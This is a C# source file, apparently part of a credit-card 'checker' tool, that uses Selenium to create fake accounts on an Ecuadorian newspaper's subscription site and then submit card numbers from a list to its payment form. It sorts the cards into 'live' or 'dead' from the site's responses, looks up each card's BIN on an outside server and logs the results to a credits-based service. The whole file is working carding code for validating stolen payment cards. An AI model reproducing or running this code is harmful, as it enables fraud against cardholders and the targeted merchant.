using gateBeta;
using Newtonsoft.Json;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Support.UI;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading;
using System.Windows.Forms;

namespace gateDanny.gates
{
    class Expreso
    {
        ChromeDriver driver;
        check check = new check();
        string correo;
        string clave;
        int pagos = 0;
        int numeroTargeta = 1;
        private readonly Random _random = new Random();

        public string checkbin(string bin)
        {

            try
            {
                string jsonString = "";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://softoo.info/thunder/bin.php/?bin=" + bin);
                request.Method = "GET";
                request.Credentials = CredentialCache.DefaultCredentials;
                ((HttpWebRequest)request).UserAgent = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)";
                request.Accept = "/";
                request.UseDefaultCredentials = true;
                request.Proxy.Credentials = System.Net.CredentialCache.DefaultCredentials;
                //request.ContentType = "application/x-www-form-urlencoded";
                request.ContentType = "application/x-www-form-urlencoded";
                WebResponse response = request.GetResponse();
                StreamReader sr = new StreamReader(response.GetResponseStream());
                jsonString = sr.ReadToEnd();
                sr.Close();
                return jsonString.Trim();
            }
            catch (Exception ex)
            {

                return "Desconocido";
            }
        }

        private string getNum()
        {
            Random obj = new Random();
            string posibles = "0123456789";
            int longitud = posibles.Length;
            char letra;
            int longitudnuevacadena = 9;
            string nuevacadena = "";
            for (int i = 0; i < longitudnuevacadena; i++)
            {
                letra = posibles[obj.Next(longitud)];
                nuevacadena += letra.ToString();
            }
            return nuevacadena;
        }

        public int RandomNumber(int min, int max)
        {
            return _random.Next(min, max);
        }

        private bool tiempoElemento(By by)
        {
            string elemento = "";
            int tiempo = 0;

            while (elemento == "")
            {
                if (tiempo <= 15)
                {
                    if (IsElementPresent(by))
                    {
                        if (driver.FindElement(by).Displayed == true)
                        {
                            elemento = "ok";
                        }
                    }

                }
                else
                {
                    elemento = "Error";
                }
                tiempo++;
            }

            if (elemento != "Error")
            {
                return true;
                //DetailProduct();
            }
            else
            {
                return false;
            }
        }

        private bool tiempoElementoeMAIL(By by)
        {
            string elemento = "";
            int tiempo = 0;

            while (elemento == "")
            {
                if (tiempo <= 15)
                {

                    if (IsElementPresent(By.XPath("//*[@id='refresh']")))
                    {
                        driver.FindElement(By.XPath("//*[@id='refresh']")).Click();
                        Thread.Sleep(1000);
                    }


                    if (IsElementPresent(by))
                    {
                        if (driver.FindElement(by).Displayed == true)
                        {
                            elemento = "ok";
                        }
                    }

                }
                else
                {
                    elemento = "Error";
                }
                tiempo++;
            }

            if (elemento != "Error")
            {
                return true;
                //DetailProduct();
            }
            else
            {
                return false;
            }
        }

        private void GetEmail()
        {


            //###--obtener email--#####
            ((IJavaScriptExecutor)driver).ExecuteScript("window.open();");
            driver.SwitchTo().Window(driver.WindowHandles.Last());
            Thread.Sleep(300);
            driver.Url = "https://www.abandonmail.com/es";
            Thread.Sleep(5000);

            if (tiempoElemento(By.XPath("//*[@id='randombtn']")))
            {
                driver.FindElement(By.XPath("//*[@id='randombtn']")).Click();
                Thread.Sleep(1000);
            }
            else
            {

                restart();
            }

            if (tiempoElemento(By.XPath("//*[@id='emailtouse']")))
            {
                correo = driver.FindElement(By.XPath("//*[@id='emailtouse']")).GetAttribute("value");
                Thread.Sleep(1000);
            }
            else
            {

                restart();
            }

            Thread.Sleep(3000);

            driver.SwitchTo().Window(driver.WindowHandles.First());



        }


        public void load()
        {
            check.login(Variables.key);
            if (int.Parse(Variables.creditos) <= 0)
            {
                MessageBox.Show("Recargue sus creditos");
                return;
            }


            if (Thunder._Form1.numcc() > 0 && Variables.run == true && Variables.gate=="3")
            {

                try
                {
                    Thunder._Form1.update_progresbar(5);
                    var chromeOptions = new ChromeOptions();
                    //correo = "joseffernana" + getNum() + "@gmail.com";
                    clave = "Jo." + getNum();

                    //chromeOptions.AddArguments(new List<string>() { "headless" });
                    //chromeOptions.AddArguments("--blink-settings=imagesEnabled=false", "--window-size=1920,1080");, "--headless"
                    chromeOptions.AddArguments("--window-size=1920,1080", "--blink-settings=imagesEnabled=false", "--incognito",  "--ignore-certificate-errors"); //"--proxy-server=http://p.webshare.io:9999",

                    var chromeDriverService = ChromeDriverService.CreateDefaultService();
                    chromeDriverService.HideCommandPromptWindow = true;

                    driver = new ChromeDriver(chromeDriverService, chromeOptions);
                    driver.Url = "https://suscripcion.expreso.ec/id/register?continue=https://suscripcion.expreso.ec/suscripcion/PROSDPEXPRESO";
                    ////Thread.Sleep(1000);
                    correo = "joseffernana" + getNum() + "@hotmail.com";
                    //Thread.Sleep(2000);
                    //Process.Start("proxy.exe");
                    //Thread.Sleep(2000);


                    if (tiempoElemento(By.Id("first_name")))
                    {
                        Thunder._Form1.update_progresbar(10);
                        enviarTexto(By.Id("first_name"), "JOSE");
                        enviarTexto(By.Id("last_name"), "REYES");
                        enviarTexto(By.Id("phone_number"), "099685" + RandomNumber(1000, 9999));
                        GetEmail();
                        enviarTexto(By.Id("email"), correo);
                        enviarTexto(By.Id("password"), clave);
                        enviarTexto(By.Id("password-confirm"), clave);
                        driver.ExecuteScript("document.querySelector('#accept').checked=true");
                        Thread.Sleep(2000);
                        clickElemento(By.XPath("//*[@id='form']/div[7]/button"));
                        Thread.Sleep(2000);

                        if (tiempoElemento(By.Id("birth_date")))
                        {
                            Thunder._Form1.update_progresbar(30);
                            //driver.ExecuteScript("document.querySelector('#birth_date').value='23/04/1993'");
                            driver.ExecuteScript("document.querySelector('#birth_date').value='23/04/1993'");
                            Thread.Sleep(500);
                            var sexo = new SelectElement(driver.FindElement(By.Id("gender")));
                            sexo.SelectByValue("H");
                            Thread.Sleep(500);
                            driver.FindElement(By.XPath("//*[@id='form']/button")).Click();
                            Thread.Sleep(1000);

                            if (tiempoElemento(By.XPath("/html/body/div[2]/div/div[3]/button[1]")))
                            {

                            }
                            else
                            {
                                enviarTexto(By.Id("birth_date"), "23/04/199" + RandomNumber(1, 9));
                                Thread.Sleep(1000);
                                clickElemento(By.XPath("/html/body/div/div/div[2]/div"));
                                Thread.Sleep(1000);
                                clickElemento(By.XPath("//*[@id='form']/button"));
                                Thread.Sleep(1000);
                            }

                            //GETCODIGO
                            //Thread.Sleep(3000);
                            driver.SwitchTo().Window(driver.WindowHandles[1]);
                            Thread.Sleep(500);

                            if (tiempoElemento(By.XPath("//*[@id='refresh']")))
                            {
                                Thunder._Form1.update_progresbar(40);
                                driver.FindElement(By.XPath("//*[@id='refresh']")).Click();
                                Thread.Sleep(3000);

                                if (tiempoElementoeMAIL(By.XPath("//*[@id='inbox']/table/tbody/tr")))
                                {
                                    driver.FindElement(By.XPath("//*[@id='inbox']/table/tbody/tr")).Click();
                                    Thread.Sleep(1000);
                                    //opt
                                    if (tiempoElemento(By.XPath("//*[@id='message-frame']")))
                                    {
                                        Thunder._Form1.update_progresbar(50);
                                        driver.SwitchTo().Frame(driver.FindElement(By.XPath("//*[@id='message-frame']")));
                                        Thread.Sleep(1000);
                                        if (IsElementPresent(By.XPath("/html/body/div/div[2]/table/tbody/tr[2]/td/table/tbody/tr/td/table[1]/tbody/tr/td/table/tbody/tr/td/table/tbody/tr/td/a")))
                                        {
                                            driver.FindElement(By.XPath("/html/body/div/div[2]/table/tbody/tr[2]/td/table/tbody/tr/td/table[1]/tbody/tr/td/table/tbody/tr/td/table/tbody/tr/td/a")).Click();
                                            Thunder._Form1.update_progresbar(60);
                                            Thread.Sleep(2000);

                                            Thread.Sleep(500);
                                            driver.SwitchTo().Window(driver.WindowHandles[2]);
                                            Thread.Sleep(500);
                                            driver.SwitchTo().ParentFrame();
                                            Thread.Sleep(100);
                                            if (tiempoElemento(By.Id("email")))
                                            {
                                                Thunder._Form1.update_progresbar(70);
                                                enviarTexto(By.Id("email"), correo);
                                                enviarTexto(By.Id("password"), clave + OpenQA.Selenium.Keys.Enter);


                                                Thread.Sleep(1000);

                                                if (tiempoElemento(By.XPath("/html/body/section[2]/div/div/div/div[1]/div/div[1]/div/div/a[2]"))){
                                                    driver.FindElementByXPath("/html/body/section[2]/div/div/div/div[1]/div/div[1]/div/div/a[2]").Click();
                                                    Thread.Sleep(1000);
                                                }
                                                else
                                                {
                                                    restart();
                                                }

                                                //driver.Navigate().GoToUrl("https://suscripcion.expreso.ec/suscripcion/PROSDPEXPRESO");
                                                Thread.Sleep(1000);
                                                if (tiempoElemento(By.XPath("//*[@id='form']/form/div[2]/div[4]/div/div/input")))
                                                {
                                                    Thunder._Form1.update_progresbar(80);
                                                    enviarTexto(By.XPath("//*[@id='form']/form/div[2]/div[4]/div/div/input"), "050435" + RandomNumber(1000, 9999));
                                                    Thread.Sleep(1000);
                                                    var provincia = new SelectElement(driver.FindElement(By.Id("shipping.state")));
                                                    provincia.SelectByIndex(RandomNumber(1, 20));
                                                    Thread.Sleep(100);
                                                    if (IsElementPresent(By.XPath("//*[@id='form']/form/div[5]/div[2]/div/div[2]/div/div/input")))
                                                    {
                                                        pago();
                                                    }
                                                    else
                                                    {
                                                        restart();
                                                    }
                                                }
                                                else
                                                {
                                                    restart();
                                                }

                                            }
                                            else
                                            {
                                                restart();
                                            }
                                        }
                                        else
                                        {

                                            restart();
                                        }
                                    }
                                    else
                                    {

                                        restart();
                                    }
                                }
                                else
                                {

                                    restart();
                                }

                            }
                            else
                            {

                                restart();
                            }

                        }
                        else
                        {
                            restart();
                        }


                    }
                    else
                    {
                        restart();
                    }
                }
                catch (Exception ex)
                {

                    if(Thunder._Form1.numcc() > 0 && Variables.run == true && Variables.gate == "3")
                    {
                        restart();
                    }
                }

                
            }
        }

        private void enviarTexto(By by, string texto)
        {
            driver.FindElement(by).SendKeys(texto);
        }

        private void clickElemento(By by)
        {
            driver.FindElement(by).Click();
        }

        private bool IsElementPresent(By by)
        {
            try
            {
                Thread.Sleep(1000);
                driver.FindElement(by);
                return true;
            }
            catch (NoSuchElementException)
            {
                return false;
            }
        }

        private void restart()
        {

            Thunder._Form1.update_progresbar(0);

            if(Thunder._Form1.numcc() > 0 && Variables.run == true && Variables.gate == "3")
            {

            

            try
            {
                pagos = 0;

                driver.Close();
                driver.Quit();
                load();
            }
            catch (Exception)
            {
                pagos = 0;
                driver.Quit();
                load();
            }
            }

        }

        private void pago()
        {
            try
            {


                if (Thunder._Form1.numcc() > 0 && Variables.run == true && Variables.gate == "3")
                {
                    if (pagos < 8)
                    {
                        Thunder._Form1.update_progresbar(90);
                        string cc = Thunder._Form1.nextCc();
                        string[] ccLine = cc.Split('|');
                        var ccnum = ccLine[0];
                        var mes = ccLine[1];
                        var anio = ccLine[2];


                        if (IsElementPresent(By.XPath("//*[@id='form']/form/div[6]/div[4]/div/div/input")))
                        {
                            enviarTexto(By.XPath("//*[@id='form']/form/div[6]/div[4]/div/div/input"), ccnum); ;
                            Thread.Sleep(100);
                            enviarTexto(By.XPath("//*[@id='form']/form/div[6]/div[5]/div/div/input"), mes);
                            Thread.Sleep(100);
                            enviarTexto(By.XPath("//*[@id='form']/form/div[6]/div[6]/div/div/input"), anio.Remove(0, 2));
                            
                            Thread.Sleep(500);
                            var tipo = new SelectElement(driver.FindElement(By.Id("credit_card.type")));

                            if (ccnum[0].ToString().Trim() == "4")
                            {
                                tipo.SelectByValue("VISA");
                                Thread.Sleep(100);
                                enviarTexto(By.XPath("//*[@id='form']/form/div[6]/div[7]/div/div/input"), ccLine[3]);
                            }

                            if (ccnum[0].ToString().Trim() == "5")
                            {
                                tipo.SelectByValue("MASTERCARD");
                                Thread.Sleep(100);
                                enviarTexto(By.XPath("//*[@id='form']/form/div[6]/div[7]/div/div/input"), ccLine[3]);
                            }


                            if (ccnum[0].ToString().Trim() == "3")
                            {
                                tipo.SelectByValue("MASTERCARD");
                                Thread.Sleep(500);
                                enviarTexto(By.XPath("//*[@id='form']/form/div[6]/div[7]/div/div/input"), ccLine[3]);
                                Thread.Sleep(500);
                            }
                            Thread.Sleep(1000);
                            driver.FindElement(By.XPath("//*[@id='form']/form/div[8]/div/div/button")).Click();
                            Thread.Sleep(6000);
                        }

                        if (IsElementPresent(By.XPath("//*[@id='form']/form/div[5]/div[4]/div/div/input")))
                        {
                            enviarTexto(By.XPath("//*[@id='form']/form/div[5]/div[4]/div/div/input"), ccnum); ;
                            Thread.Sleep(100);
                            enviarTexto(By.XPath("//*[@id='form']/form/div[5]/div[5]/div/div/input"), mes);
                            Thread.Sleep(100);
                            enviarTexto(By.XPath("//*[@id='form']/form/div[5]/div[6]/div/div/input"), anio.Remove(0, 2));
                            Thread.Sleep(100);
                            enviarTexto(By.XPath("//*[@id='form']/form/div[5]/div[7]/div/div/input"), "000");
                            Thread.Sleep(500);
                            var tipo = new SelectElement(driver.FindElement(By.Id("credit_card.type")));

                            if (ccnum[0].ToString().Trim() == "4")
                            {
                                tipo.SelectByValue("VISA");
                            }

                            if (ccnum[0].ToString().Trim() == "5")
                            {
                                tipo.SelectByValue("MASTERCARD");
                            }

                            if (ccnum[0].ToString().Trim() == "3")
                            {
                                tipo.SelectByValue("MASTERCARD");
                                Thread.Sleep(500);
                                enviarTexto(By.XPath("//*[@id='form']/form/div[5]/div[7]/div/div/input"), "0");
                                Thread.Sleep(500);
                            }

                            Thread.Sleep(1000);

                            driver.FindElement(By.XPath("//*[@id='form']/form/div[7]/div/div/button")).Click();
                            Thread.Sleep(6000);
                        }

                        

                        if (confirmar())
                        {
                            Thunder._Form1.update_progresbar(100);
                            var pais = checkbin(cc.Substring(0, 6));
                            var guardar = numeroTargeta + " - " + cc + " - " + pais + " " + Variables.gate;
                            check.ccss(Variables.key, guardar, "lives");
                            Thunder._Form1.agrgar_live(" ** APROVADO ** - " + cc + " - " + pais);
                            check.playlive();
                            Console.WriteLine("live " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Thunder._Form1.remove_cc(0, cc.Length);
                            numeroTargeta++;
                            pagos++;
                            restart();
                        }
                        else
                        {
                            var pais = checkbin(cc.Substring(0, 6));
                            Thunder._Form1.update_progresbar(100);
                            var guardar = numeroTargeta + " - " + cc + " - " + pais + " " + Variables.gate;
                            check.ccss(Variables.key, guardar, "deads");
                            Thread.Sleep(300);
                            Thunder._Form1.agragar_dead(cc);
                            Console.WriteLine("dead " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Thunder._Form1.remove_cc(0, cc.Length);
                            numeroTargeta++;
                            pagos++;
                            pago();
                        }
                    }
                    else
                    {
                        restart();
                    }
                }
            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.ToString());
                if (Thunder._Form1.numcc() > 0 && Variables.run == true && Variables.gate == "3")
                {
                    restart();
                }

            }

        }

        public void stop()
        {
            pagos = 0;
            numeroTargeta = 0;
            driver.Close();
            driver.Quit();
        }

        public bool confirmar()
        {
            string estado = "";
            bool resp = false;

            int tiempo = 0;

           

            while (estado == "")
            {

                if (tiempo < 10)
                {
                    

                    if (IsElementPresent(By.XPath("//*[@id='form']/form/div[5]")))
                    {
                        if (driver.FindElement(By.XPath("//*[@id='form']/form/div[5]")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("//*[@id='form']/form/div[5]")).Text.Trim().Contains("cvv"))
                            {
                                Thunder._Form1.agrgar_live_cvv("(cvv) - ");
                                estado = "live";
                            }
                            else
                            {
                                estado = "dead";
                            }
                        }
                    }

                    if (IsElementPresent(By.XPath("/html/body/section[2]/div/div/div/div/h1")))
                    {
                        if (driver.FindElement(By.XPath("/html/body/section[2]/div/div/div/div/h1")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("/html/body/section[2]/div/div/div/div/h1")).Text.Trim() == "¡Felicitaciones!")
                            {
                                estado = "live";
                            }
                        }
                    }

                    if (IsElementPresent(By.XPath("/html/body/section[2]/div/div/div[1]/div[1]/form/div[8]/div/div[2]/b")))
                    {
                        if (driver.FindElementByXPath("/html/body/section[2]/div/div/div[1]/div[1]/form/div[8]/div/div[2]/b").Displayed == true)
                        {
                            Thread.Sleep(1000);
                            estado = "";
                        }
                    }




                }
                else
                {
                    estado = "error";
                }

                tiempo++;
            }

            if (estado == "dead")
            {

                return false;
            }

            if (estado == "live")
            {
                return true;
            }

            if (estado == "error")
            {
                restart();
                return false;
            }

            return false;

        }



        public static DialogResult InputBox(string title, string promptText, ref string value)
        {
            Form form = new Form();
            Label label = new Label();
            TextBox textBox = new TextBox();
            Button buttonOk = new Button();
            Button buttonCancel = new Button();
            form.Text = title;
            label.Text = promptText;
            textBox.Text = value;

            buttonOk.Text = "OK";
            buttonCancel.Text = "Cancel";
            buttonOk.DialogResult = DialogResult.OK;
            buttonCancel.DialogResult = DialogResult.Cancel;
            label.SetBounds(9, 20, 372, 13);
            textBox.SetBounds(12, 36, 372, 20);
            buttonOk.SetBounds(228, 72, 75, 23);
            buttonCancel.SetBounds(309, 72, 75, 23);

            label.AutoSize = true;
            textBox.Anchor = textBox.Anchor | AnchorStyles.Right;
            buttonOk.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
            buttonCancel.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;

            form.ClientSize = new Size(396, 107);
            form.Controls.AddRange(new Control[] { label, textBox, buttonOk, buttonCancel });
            form.ClientSize = new Size(Math.Max(300, label.Right + 10), form.ClientSize.Height);
            form.FormBorderStyle = FormBorderStyle.FixedDialog;
            form.StartPosition = FormStartPosition.CenterScreen;
            form.MinimizeBox = false;
            form.MaximizeBox = false;
            form.AcceptButton = buttonOk;
            form.CancelButton = buttonCancel;
            DialogResult dialogResult = form.ShowDialog();
            value = textBox.Text;
            return dialogResult;
        }
    }
}



